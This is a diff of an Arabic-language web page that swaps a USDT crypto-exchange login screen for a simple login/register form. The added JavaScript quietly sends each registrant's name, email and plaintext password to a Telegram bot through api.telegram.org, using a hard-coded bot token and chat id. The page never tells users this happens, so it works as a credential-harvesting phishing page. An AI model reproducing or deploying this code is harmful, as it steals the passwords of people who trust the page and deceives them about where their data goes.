@@ -1,262 +1,138 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MOUAYED TAIBI - USDT Exchange</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap');
-        
-        :root {
-            --primary: #1a1a2e; /* أزرق داكن */
-            --secondary: #16213e; /* أزرق داكن أعمق */
-            --accent: #D4AF37; /* ذهبي */
-            --dark: #0d0d1a;
-            --light: #f8f9fa;
-            --success: #4caf50;
-            --danger: #f44336;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Tajawal', sans-serif;
-        }
-        
-        body {
-            background-color: #f5f7fa;
-            color: #333;
-            transition: all 0.3s ease;
-        }
-        
-        /* صفحة تسجيل الدخول */
-        .login-container {
-            display: flex;
-            min-height: 100vh;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .login-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://images.unsplash.com/photo-1639762681057-408e52192e55?q=80&w=2232&auto=format&fit=crop') no-repeat center/cover;
-            opacity: 0.1;
-            z-index: 0;
-        }
-        
-        .login-box {
-            width: 100%;
-            max-width: 500px;
-            background: rgba(26, 26, 46, 0.9); /* خلفية زرقاء داكنة شفافة */
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 40px;
-            margin: auto;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
-            position: relative;
-            z-index: 1;
-            border: 1px solid var(--accent); /* إطار ذهبي */
-        }
-        
-        .login-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .login-header img {
-            width: 80px;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 0 5px var(--accent)); /* تأثير ذهبي */
-        }
-        
-        .login-header h1 {
-            color: var(--accent); /* لون ذهبي */
-            font-size: 2rem;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-        }
-        
-        .login-header p {
-            color: rgba(255,255,255,0.8);
-            font-size: 1rem;
-            line-height: 1.6;
-        }
-        
-        .input-group {
-            margin-bottom: 25px;
-            position: relative;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: rgba(255,255,255,0.8);
-            font-weight: 500;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(212, 175, 55, 0.3);
-            border-radius: 8px;
-            font-size: 1rem;
-            transition: all 0.3s;
-            color: white;
-        }
-        
-        .input-group input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.2);
-            outline: none;
-            background: rgba(255,255,255,0.15);
-        }
-        
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(45deg, var(--accent), #b38b2d);
-            color: var(--primary);
-            border: none;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
-            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
-        }
-        
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(212, 175, 55, 0.4);
-        }
-        
-        .login-footer {
-            text-align: center;
-            margin-top: 20px;
-            color: rgba(255,255,255,0.6);
-        }
-        
-        .login-footer a {
-            color: var(--accent);
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s;
-        }
-        
-        .login-footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* بقية الأكواد (الواجهة بعد التسجيل) تبقى كما هي مع تعديل الألوان */
-        /* ... */
-        
-        /* زر الدعم الجانبي */
-        .support-btn {
-            position: fixed;
-            bottom: 30px;
-            left: 30px;
-            background: linear-gradient(45deg, var(--accent), #b38b2d);
-            color: var(--primary);
-            padding: 15px 25px;
-            border-radius: 30px;
-            text-decoration: none;
-            font-weight: bold;
-            box-shadow: 0 5px 20px rgba(212, 175, 55, 0.4);
-            z-index: 99;
-            display: flex;
-            align-items: center;
-            transition: all 0.3s;
-        }
-        
-        .support-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(212, 175, 55, 0.5);
-        }
-        
-        .support-btn i {
-            margin-left: 8px;
-            color: var(--primary);
-        }
-
-        /* تأثيرات إضافية للذهب */
-        .gold-text {
-            color: var(--accent);
-        }
-        
-        .gold-border {
-            border: 1px solid var(--accent);
-        }
-        
-        .gold-shadow {
-            box-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>تسجيل دخول / إنشاء حساب</title>
+  <style>
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: #1a1a2e;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: rgba(0,0,0,0.6);
+      padding: 30px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(212, 175, 55, 0.5);
+    }
+    h2 {
+      text-align: center;
+      color: #D4AF37;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #D4AF37;
+      background: transparent;
+      color: white;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background: #D4AF37;
+      color: #1a1a2e;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .switch {
+      text-align: center;
+      margin-top: 15px;
+    }
+    .switch a {
+      color: #D4AF37;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <!-- صفحة تسجيل الدخول -->
-    <div class="login-container" id="login-container">
-        <div class="login-bg"></div>
-        <div class="login-box gold-shadow">
-            <div class="login-header">
-                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo">
-                <h1>مرحبًا بك في منصة <span class="gold-text">MOUAYED TAIBI</span></h1>
-                <p>منصة التبادل الآمنة للعملات الرقمية مع أفضل الأسعار وأعلى معدلات الأمان</p>
-            </div>
-            
-            <form id="login-form">
-                <div class="input-group">
-                    <label for="username">اسم المستخدم</label>
-                    <input type="text" id="username" required placeholder="أدخل اسم المستخدم">
-                </div>
-                
-                <div class="input-group">
-                    <label for="password">كلمة المرور</label>
-                    <input type="password" id="password" required placeholder="أدخل كلمة المرور">
-                </div>
-                
-                <button type="submit" class="login-btn">
-                    <i class="fas fa-sign-in-alt"></i> تسجيل الدخول
-                </button>
-            </form>
-            
-            <div class="login-footer">
-                <p>ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
-                <p>نسيت كلمة المرور؟ <a href="#">استعاده</a></p>
-            </div>
-        </div>
-    </div>
-    
-    <!-- بقية الأكواد (الواجهة بعد التسجيل) تبقى كما هي -->
-    <!-- ... -->
-    
-    <script>
-        // تسجيل الدخول (بدون reCAPTCHA)
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if(username && password) {
-                document.getElementById('login-container').style.display = 'none';
-                // document.getElementById('dashboard').style.display = 'block';
-                alert('تم تسجيل الدخول بنجاح! سيتم تحويلك للوحة التحكم.');
-                // في التطبيق الحقيقي، هنا يتم التوجيه للوحة التحكم
-            } else {
-                alert('الرجاء إدخال اسم المستخدم وكلمة المرور');
-            }
+
+  <div class="container" id="auth-container">
+    <h2 id="form-title">تسجيل الدخول</h2>
+    <form id="auth-form">
+      <div id="name-field" style="display: none;">
+        <label for="name">اسم المستخدم</label>
+        <input type="text" id="name" placeholder="اسمك الكامل" />
+      </div>
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="example@email.com" required />
+      
+      <label for="password">كلمة المرور</label>
+      <input type="password" id="password" placeholder="********" required />
+
+      <button type="submit" id="submit-btn">تسجيل الدخول</button>
+
+      <div class="switch">
+        <span id="switch-msg">ليس لديك حساب؟ <a onclick="toggleMode()">سجل الآن</a></span>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    let isRegister = false;
+
+    function toggleMode() {
+      isRegister = !isRegister;
+      document.getElementById('form-title').textContent = isRegister ? 'إنشاء حساب' : 'تسجيل الدخول';
+      document.getElementById('submit-btn').textContent = isRegister ? 'سجل الآن' : 'تسجيل الدخول';
+      document.getElementById('name-field').style.display = isRegister ? 'block' : 'none';
+      document.getElementById('switch-msg').innerHTML = isRegister 
+        ? 'لديك حساب؟ <a onclick="toggleMode()">سجّل الدخول</a>'
+        : 'ليس لديك حساب؟ <a onclick="toggleMode()">سجل الآن</a>';
+    }
+
+    document.getElementById('auth-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const name = document.getElementById('name').value || 'غير مسجل';
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      if (!email || !password || (isRegister && !name)) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+      }
+
+      if (isRegister) {
+        // إرسال إلى بوت التليغرام
+        const token = '7368039692:AAGOPu6YEqvUS-u1NXOswLwvYaovRrNpiWI';
+        const chatId = '7025276107';
+        const message = `🟢 مستخدم جديد تم تسجيله:\n\n👤 الاسم: ${name}\n📧 الإيميل: ${email}\n🔒 كلمة المرور: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        }).then(() => {
+          alert("تم التسجيل بنجاح! ✅");
+        }).catch(() => {
+          alert("حدث خطأ أثناء الإرسال للبوت");
         });
-        
-        // يمكنك إضافة بقية الأكواد JavaScript هنا
-    </script>
+      } else {
+        alert("تم تسجيل الدخول!");
+      }
+
+      document.getElementById('auth-form').reset();
+    });
+  </script>
 </body>
 </html>
